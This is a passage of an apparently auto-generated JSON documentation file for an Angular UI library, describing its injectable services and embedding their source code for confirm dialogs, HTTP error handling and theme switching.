            "sourceCode": "import { Injectable } from '@angular/core';\nimport { MatDialog, MatDialogRef } from '@angular/material/dialog';\nimport { Observable, ReplaySubject } from 'rxjs';\nimport { ConfirmComponent } from './sto-confirm-dialog.component';\n\n\n@Injectable()\nexport class ConfirmService {\n  public ref: MatDialogRef<ConfirmComponent> | null;\n\n  constructor(private dialog: MatDialog) {\n  }\n\n  confirm(message: string, title = 'Confirm', confirmText = 'OK', showCancel = true): Observable<boolean> {\n    this.ref = this.dialog.open(ConfirmComponent, {\n      data: { message, title, confirmText, showCancel }\n    });\n\n    const subject = new ReplaySubject<boolean>();\n\n    this.ref.afterClosed()\n      .subscribe(result => {\n        this.ref = null;\n        subject.next(result);\n        subject.complete();\n      });\n    return subject;\n  }\n\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "dialog",
                        "type": "MatDialog"
                    }
                ],
                "line": 9,
                "jsdoctags": [
                    {
                        "name": "dialog",
                        "type": "MatDialog",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "type": "injectable"
        },
        {
            "name": "ErrorDialogService",
            "id": "injectable-ErrorDialogService-e643ea50921afa3666c7dcc1f0043f55",
            "file": "libs/error-handler/src/lib/error-handler/error-dialog.service.ts",
            "properties": [
                {
                    "name": "ref",
                    "type": "MatDialogRef<DialogComponent>",
                    "optional": false,
                    "description": "",
                    "line": 10,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methods": [
                {
                    "name": "open",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpError"
                        }
                    ],
                    "optional": false,
                    "returnType": "MatDialogRef<DialogComponent, unknown>",
                    "typeParameters": [],
                    "line": 16,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpError",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "description": "",
            "sourceCode": "import { Injectable } from '@angular/core';\nimport { MatDialog, MatDialogRef } from '@angular/material/dialog';\nimport { HttpError } from './http-error';\nimport { DialogComponent } from './dialog/dialog.component';\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorDialogService {\n  private ref: MatDialogRef<DialogComponent>;\n\n  constructor(private dialog: MatDialog) {\n  }\n\n  // Opens a dialog, and returns the reference with the close results.\n  open(err: HttpError): MatDialogRef<DialogComponent, unknown> {\n    if ( this.ref ) {\n      this.ref.close(null);\n    }\n    this.ref = this.dialog.open(DialogComponent, {\n      data: err,\n      width: '560px',\n      autoFocus: false,\n      disableClose: true,\n      panelClass: 'sto-dialog'\n    });\n    return this.ref;\n  }\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "dialog",
                        "type": "MatDialog"
                    }
                ],
                "line": 10,
                "jsdoctags": [
                    {
                        "name": "dialog",
                        "type": "MatDialog",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "type": "injectable"
        },
        {
            "name": "ErrorHandlerImpl",
            "id": "injectable-ErrorHandlerImpl-d6b390bd06c9afda3491a082f88bf21e",
            "file": "libs/error-handler/src/lib/wrapper.ts",
            "properties": [],
            "methods": [
                {
                    "name": "401",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 78,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "description": "",
            "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport {\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\n  ErrorHandlerService,\n  Handler,\n  HttpError,\n  StoErrorHandler\n} from '@ngx-stoui/error-handler';\n\n@Component({\n  selector: 'next-wrapper',\n  template: `\n    <button mat-button\n            (click)=\"overRide(404)\">Overridden 404\n    </button>\n    <button mat-button\n            (click)=\"showError(s)\"\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n  `,\n  providers: []\n})\nexport class NextWrapperComponent {\n  public errors = [\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ];\n\n  constructor(private service: ErrorHandlerService) {\n  }\n\n  showError(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    this.service.handler(err);\n  }\n\n  overRide(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    const handler = function (err: HttpErrorResponse) {\n      const e = new HttpError(err);\n      e.title = 'Local override 404';\n      e.text = 'Local override not found item';\n      return e;\n    };\n    this.service.handler(err, handler);\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorHandlerImpl implements StoErrorHandler {\n  [ code: number ]: Handler;\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Custom not signed in';\n    error.text = 'Custom not signed in text';\n    return error;\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class Logger {\n  constructor(private http: HttpClient) {\n  }\n\n  log(err: HttpError) {\n    // This method will typically go to the application backend or a central log repository\n    console.log('Error', err);\n  }\n}\n\nfunction LoggerFactory(http: HttpClient) {\n  return new Logger(http);\n}\n\n@NgModule({\n  declarations: [ NextWrapperComponent ],\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\n  exports: [ NextWrapperComponent ],\n  providers: [\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\n  ]\n})\nexport class WrapperModule {\n}\n\n",
            "type": "injectable"
        },
        {
            "name": "ErrorHandlerService",
            "id": "injectable-ErrorHandlerService-267741c0b13a97d7af9125f8a629c85c",
            "file": "libs/error-handler/src/lib/error-handler/error-handler.service.ts",
            "properties": [],
            "methods": [
                {
                    "name": "0",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 72,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "400",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 87,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "401",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 97,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "403",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 105,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "404",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 116,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "409",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 127,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "500",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 140,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "501",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 153,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "503",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 157,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "defaultHandler",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 57,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "getErrorText",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 167,
                    "description": "<p>Uses the getErrorText from the provided custom handler, if available.\nOtherwise, return the error message, if available in our desired format\nExpected err.error -&gt; { message: &#39;A message&#39;, ... }\nAlso handles text as a fallback.</p>\n",
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "handler",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpErrorResponse"
                        },
                        {
                            "name": "handler",
                            "type": "Handler",
                            "optional": true
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 31,
                    "description": "<p>Global handler. This method will try (in order): passed in handler -&gt; custom handler -&gt; default handler for code -&gt; defaultHandler\nAll errors are passed to a dialog to be displayed there, and will by default have a simple &quot;OK&quot; button to close.</p>\n",
                    "jsdoctags": [
                        {
                            "name": {
                                "pos": 1174,
                                "end": 1177,
                                "flags": 0,
                                "escapedText": "err"
                            },
                            "type": "HttpErrorResponse",
                            "tagName": {
                                "pos": 1168,
                                "end": 1173,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": ""
                        },
                        {
                            "name": {
                                "pos": 1190,
                                "end": 1197,
                                "flags": 0,
                                "escapedText": "handler"
                            },
                            "type": "Handler",
                            "optional": true,
                            "tagName": {
                                "pos": 1184,
                                "end": 1189,
                                "flags": 0,
                                "escapedText": "param"
                            },
                            "comment": ""
                        }
                    ]
                }
            ],
            "description": "",
            "sourceCode": "import { Inject, Injectable, Optional } from '@angular/core';\nimport { HttpErrorResponse } from '@angular/common/http';\nimport { Action, HttpError } from './http-error';\nimport { ErrorHandler, ErrorLogger, Handler } from './error-handler';\nimport { ErrorDialogService } from './error-dialog.service';\nimport { CUSTOM_ERROR_HANDLER, ERROR_LOGGER } from './token';\n\n@Injectable({\n  providedIn: 'root'\n})\n/**\n * Service used to handle errors across our applications. Replaces the previous HttpErrorHandler\n */\nexport class ErrorHandlerService implements ErrorHandler {\n\n  constructor(\n    private errorDialogService: ErrorDialogService,\n    // Optional custom error handler.\n    @Optional() @Inject(CUSTOM_ERROR_HANDLER) private customHandler: ErrorHandler,\n    // Optional logger. Nothing is logged if logger is not provided.\n    @Optional() @Inject(ERROR_LOGGER) private logger: ErrorLogger,\n  ) {\n  }\n\n  /**\n   * Global handler. This method will try (in order): passed in handler -> custom handler -> default handler for code -> defaultHandler\n   * All errors are passed to a dialog to be displayed there, and will by default have a simple \"OK\" button to close.\n   * @param err\n   * @param handler\n   */\n  handler(err: HttpErrorResponse, handler?: Handler) {\n    let fn: Handler | undefined;\n    let actions: Action[] = [];\n    fn = handler;\n    if ( !fn && this.customHandler ) {\n      fn = this.customHandler[ err.status ] || this.customHandler.defaultHandler;\n    }\n    if ( !fn ) {\n      fn = this[ err.status ] || this.defaultHandler as Handler;\n      actions = [\n        { label: 'OK' }\n      ];\n    }\n    // Ensure we bind the function to the correct context.\n    const error = fn.bind(this)(err);\n    // Add a default \"OK\" action, but only if the global handlers are used.\n    // OK is also shown if no actions are passed in.\n    error.actions = [ ...actions, ...error.actions ];\n    if ( this.logger ) {\n      // Apply logger if available.\n      this.logger.log(error);\n    }\n    this.errorDialogService.open(error);\n  }\n\n  // Fallback handler if unknown code\n  defaultHandler(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = `Application error`;\n    const errorText = this.getErrorText(err);\n    error.text = `The application experienced an unknown or unexpected exception. The exception is listed below:\n    ${errorText}`;\n    error.actions = [\n      new Action('Refresh', () => window.location.reload())\n    ];\n    return error;\n  }\n\n  // Signature for error handlers\n  [ code: number ]: Handler;\n\n  0(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'No connection';\n    const offline = !window.navigator.onLine;\n    if ( offline ) {\n      error.text = `You are not connected to the internet.`;\n    } else {\n      error.text = `We were unable to establish a connection to the server. There can be several reasons for this:\n\n    - There was an intermittent connection loss\n    - The request timed out`;\n    }\n    return error;\n  }\n\n  400(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Errors in submitted form';\n    const errorText = this.getErrorText(err);\n    error.text = `The form contained invalid data.\n\n    ${errorText}`;\n    return error;\n  }\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = `Not signed in`;\n    error.text = `You are not signed in or your session has expired. Please sign in and try again.`;\n    error.actions = [];\n    return error;\n  }\n\n  403(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = `Not authorized.`;\n    error.text = `You do not have access to perform this action.\n    Apply for the correct roles in Access IT.`;\n    error.actions = [\n      { label: 'ACCESS IT', action: () => window.open('https://accessit.equinor.com/', '_blank') }\n    ];\n    return error;\n  }\n\n  404(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Item not found';\n    const errorText = this.getErrorText(err);\n    error.text = `The requested item / resource was not found.\n\n    ${errorText}\n    `;\n    return error;\n  }\n\n  409(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'This resource has changed';\n    const errorText = this.getErrorText(err);\n    error.text = `This resource/item has been updated on the server. Please reload and try again.\n\n    ${errorText}`;\n    error.actions = [\n      { label: 'Reload', action: () => window.location.reload() }\n    ];\n    return error;\n  }\n\n  500(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = `Unexpected error occurred`;\n    const errorText = this.getErrorText(err);\n    error.text = `We experienced an unknown exception. Please report this via Services @ Equinor\n\n    ${errorText}`;\n    error.actions = [\n      { label: 'Services @ Equinor', action: () => window.open(`https://equinor.service-now.com`, '_blank') }\n    ];\n    return error;\n  }\n\n  501(err: HttpErrorResponse) {\n    return this[ 500 ](err);\n  }\n\n  503(err: HttpErrorResponse) {\n    return this[ 500 ](err);\n  }\n\n  /**\n   * Uses the getErrorText from the provided custom handler, if available.\n   * Otherwise, return the error message, if available in our desired format\n   * Expected err.error -> { message: 'A message', ... }\n   * Also handles text as a fallback.\n   * */\n  getErrorText(err: HttpErrorResponse) {\n    if ( this.customHandler && this.customHandler.getErrorText ) {\n      return this.customHandler.getErrorText(err);\n    }\n    let errorText: string;\n    try {\n      const e = err.error instanceof Object ? err.error : JSON.parse(err.error);\n      errorText = e.message;\n    } catch ( ex ) {\n      errorText = typeof err.error === 'string' ? err.error : '';\n    }\n    return errorText;\n  }\n\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "errorDialogService",
                        "type": "ErrorDialogService"
                    },
                    {
                        "name": "customHandler",
                        "type": "ErrorHandler"
                    },
                    {
                        "name": "logger",
                        "type": "ErrorLogger"
                    }
                ],
                "line": 14,
                "jsdoctags": [
                    {
                        "name": "errorDialogService",
                        "type": "ErrorDialogService",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "customHandler",
                        "type": "ErrorHandler",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "logger",
                        "type": "ErrorLogger",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "type": "injectable"
        },
        {
            "name": "Logger",
            "id": "injectable-Logger-d6b390bd06c9afda3491a082f88bf21e",
            "file": "libs/error-handler/src/lib/wrapper.ts",
            "properties": [],
            "methods": [
                {
                    "name": "log",
                    "args": [
                        {
                            "name": "err",
                            "type": "HttpError"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 93,
                    "jsdoctags": [
                        {
                            "name": "err",
                            "type": "HttpError",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "description": "",
            "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport {\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\n  ErrorHandlerService,\n  Handler,\n  HttpError,\n  StoErrorHandler\n} from '@ngx-stoui/error-handler';\n\n@Component({\n  selector: 'next-wrapper',\n  template: `\n    <button mat-button\n            (click)=\"overRide(404)\">Overridden 404\n    </button>\n    <button mat-button\n            (click)=\"showError(s)\"\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n  `,\n  providers: []\n})\nexport class NextWrapperComponent {\n  public errors = [\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ];\n\n  constructor(private service: ErrorHandlerService) {\n  }\n\n  showError(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    this.service.handler(err);\n  }\n\n  overRide(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    const handler = function (err: HttpErrorResponse) {\n      const e = new HttpError(err);\n      e.title = 'Local override 404';\n      e.text = 'Local override not found item';\n      return e;\n    };\n    this.service.handler(err, handler);\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorHandlerImpl implements StoErrorHandler {\n  [ code: number ]: Handler;\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Custom not signed in';\n    error.text = 'Custom not signed in text';\n    return error;\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class Logger {\n  constructor(private http: HttpClient) {\n  }\n\n  log(err: HttpError) {\n    // This method will typically go to the application backend or a central log repository\n    console.log('Error', err);\n  }\n}\n\nfunction LoggerFactory(http: HttpClient) {\n  return new Logger(http);\n}\n\n@NgModule({\n  declarations: [ NextWrapperComponent ],\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\n  exports: [ NextWrapperComponent ],\n  providers: [\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\n  ]\n})\nexport class WrapperModule {\n}\n\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "http",
                        "type": "HttpClient"
                    }
                ],
                "line": 89,
                "jsdoctags": [
                    {
                        "name": "http",
                        "type": "HttpClient",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "type": "injectable"
        },
        {
            "name": "StoThemeService",
            "id": "injectable-StoThemeService-b0aadf4695adf3ab70f50e04bb054f8d",
            "file": "libs/common/src/lib/theme/theme.service.ts",
            "properties": [
                {
                    "name": "destroyed$",
                    "defaultValue": "new Subject<boolean>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 16,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "document",
                    "type": "Document",
                    "optional": false,
                    "description": "",
                    "line": 19,
                    "modifierKind": [
                        112,
                        132
                    ]
                },
                {
                    "name": "previousTheme",
                    "type": "ThemeName",
                    "optional": false,
                    "description": "",
                    "line": 14,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "previousTypography",
                    "type": "TypographyName",
                    "optional": false,
                    "description": "",
                    "line": 15,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "themeObserver",
                    "type": "MutationObserver",
                    "optional": false,
                    "description": "",
                    "line": 17,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "themeSubject$",
                    "defaultValue": "new BehaviorSubject<ThemeName>('light')",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 12,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "typographyObserver",
                    "type": "MutationObserver",
                    "optional": false,
                    "description": "",
                    "line": 18,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "typographySubject$",
                    "defaultValue": "new BehaviorSubject<TypographyName>('medium')",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 13,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methods": [
                {
                    "name": "getActiveTheme",
                    "args": [],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 58
                },
                {
                    "name": "getActiveTypography",
                    "args": [],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 67
                },
                {
                    "name": "getInitialValuesFromStorage",
                    "args": [],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 143,
                    "modifierKind": [
                        112,
                        120
                    ]
                },
                {
                    "name": "listenForBodyClassChangesToTheme",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 76,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "listenForBodyClassChangesToTypography",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 111,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 35
                },
                {
                    "name": "setTheme",
                    "args": [
                        {
                            "name": "theme",
                            "type": "ThemeName"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 42,
                    "jsdoctags": [
                        {
                            "name": "theme",
                            "type": "ThemeName",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setThemeClass",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 102,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "setTypography",
                    "args": [
                        {
                            "name": "variant",
                            "type": "TypographyName"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 50,
                    "jsdoctags": [
                        {
                            "name": "variant",
                            "type": "TypographyName",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setTypographyClass",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 134,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "description": "",
            "sourceCode": "import { Inject, Injectable, OnDestroy, Optional } from '@angular/core';\nimport { BehaviorSubject, Observable, Subject } from 'rxjs';\nimport { ThemeModel, ThemeName, themes, typography, TypographyName } from './models';\nimport { map, take, takeUntil } from 'rxjs/operators';\nimport { DOCUMENT } from '@angular/common';\nimport { THEME_SAVER, ThemeSaver, ThemeSaverService } from './theme-saver.service';\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class StoThemeService implements OnDestroy {\n  private themeSubject$ = new BehaviorSubject<ThemeName>('light');\n  private typographySubject$ = new BehaviorSubject<TypographyName>('medium');\n  private previousTheme: ThemeName;\n  private previousTypography: TypographyName;\n  private destroyed$ = new Subject<boolean>();\n  private themeObserver: MutationObserver;\n  private typographyObserver: MutationObserver;\n  private readonly document: Document;\n\n  constructor(@Inject(DOCUMENT) document: Document,\n              @Optional() @Inject(THEME_SAVER) private readonly saver: ThemeSaver<Observable<ThemeModel>>) {\n    if ( !this.saver ) {\n      this.saver = new ThemeSaverService();\n    }\n    this.document = document as Document;\n    this.listenForBodyClassChangesToTheme();\n    this.listenForBodyClassChangesToTypography();\n    this.setThemeClass();\n    this.setTypographyClass();\n    this.getInitialValuesFromStorage();\n    this.document.body.classList.add('mat-app-background');\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n    this.themeObserver.disconnect();\n    this.typographyObserver.disconnect();\n  }\n\n  setTheme(theme: ThemeName) {\n    if ( !theme || !themes.has(theme) ) {\n      theme = 'light';\n    }\n    this.themeSubject$.next(theme);\n    return this.saver.save({ type: 'theme', value: theme });\n  }\n\n  setTypography(variant: TypographyName) {\n    if ( !variant || !typography.has(variant) ) {\n      variant = 'medium';\n    }\n    this.typographySubject$.next(variant);\n    return this.saver.save({ type: 'typography', value: variant });\n  }\n\n  getActiveTheme() {\n    return this.themeSubject$\n      .asObservable()\n      .pipe(map(val => ( {\n        name: val,\n        className: themes.get(val)\n      } )));\n  }\n\n  getActiveTypography() {\n    return this.typographySubject$\n      .asObservable()\n      .pipe(map(val => ( {\n        name: val,\n        className: typography.get(val)\n      } )));\n  }\n\n  private listenForBodyClassChangesToTheme() {\n    const body = this.document.body;\n    this.themeObserver = new MutationObserver((mutations) => {\n      mutations.forEach(m => {\n        const t = m.target as HTMLBodyElement;\n        const darkmode = t.classList.contains('sto-dark-theme');\n        const themeName = darkmode ? 'dark' : 'light';\n        if ( this.previousTheme === themeName ) {\n          return;\n        }\n        this.previousTheme = themeName;\n        if ( darkmode ) {\n          this.setTheme('dark');\n        } else {\n          this.setTheme('light');\n        }\n      });\n    });\n    this.themeObserver.observe(body, {\n      attributes: true,\n      attributeFilter: [ 'class' ],\n      childList: false,\n      characterData: false\n    });\n  }\n\n  private setThemeClass() {\n    this.getActiveTheme()\n      .pipe(takeUntil(this.destroyed$))\n      .subscribe((theme) => {\n        this.document.body.classList.remove('sto-dark-theme', 'sto-light-theme');\n        this.document.body.classList.add(themes.get(theme.name) ?? '');\n      });\n  }\n\n  private listenForBodyClassChangesToTypography() {\n    const body = this.document.body;\n    this.typographyObserver = new MutationObserver((mutations) => {\n      mutations.forEach(m => {\n        const t = m.target as HTMLBodyElement;\n        const small = t.classList.contains(typography.get('small') ?? '');\n        const large = t.classList.contains(typography.get('large') ?? '');\n        const typographyName: TypographyName = small ? 'small' : large ? 'large' : 'medium';\n        if ( this.previousTypography === typographyName ) {\n          return;\n        }\n        this.previousTypography = typographyName;\n        this.setTypography(typographyName);\n      });\n    });\n    this.typographyObserver.observe(body, {\n      attributes: true,\n      attributeFilter: [ 'class' ],\n      childList: false,\n      characterData: false\n    });\n  }\n\n  private setTypographyClass() {\n    this.getActiveTypography()\n      .pipe(takeUntil(this.destroyed$))\n      .subscribe((typo) => {\n        this.document.body.classList.remove(...typography.values());\n        this.document.body.classList.add(typo.className ?? '');\n      });\n  }\n\n  private async getInitialValuesFromStorage() {\n    try {\n      const theme = await this.saver.load('theme')\n        .pipe(take(1))\n        .toPromise();\n      this.setTheme(theme.value as ThemeName);\n      const typo = await this.saver.load('typography')\n        .pipe(take(1))\n        .toPromise();\n      this.setTypography(typo.value as TypographyName);\n    } catch {\n      // gotta catch em all\n    }\n  }\n}\n",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "document",
                        "type": "Document"
                    },
                    {
                        "name": "saver",
                        "type": "ThemeSaver<Observable<ThemeModel>>"
                    }
                ],
                "line": 19,
                "jsdoctags": [
                    {
                        "name": "document",
                        "type": "Document",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "saver",
                        "type": "ThemeSaver<Observable<ThemeModel>>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "type": "injectable"
        },
        {
            "name": "StoUserPreferenceService",
            "id": "injectable-StoUserPreferenceService-8934c79b7373a857be2d188853f465e7",
            "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
            "properties": [
                {
                    "name": "default",
                    "defaultValue": "{\n    hasSelectTextOnFocusEnabled: true\n  }",
                    "type": "object",
                    "optional": false,
                    "description": "",
                    "line": 13,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "hasSelectTextOnFocusEnabled",
                    "defaultValue": "new BehaviorSubject<boolean>(true)",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 9,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "preferences",
                    "type": "literal type",
                    "optional": false,
                    "description": "",
                    "line": 10,
                    "modifierKind": [
                        114
                    ]
                }
            ],
            "methods": [
                {
                    "name": "getPreferences",
                    "args": [],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 36,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "setHasSelectTextOnFocusEnabled",
                    "args": [
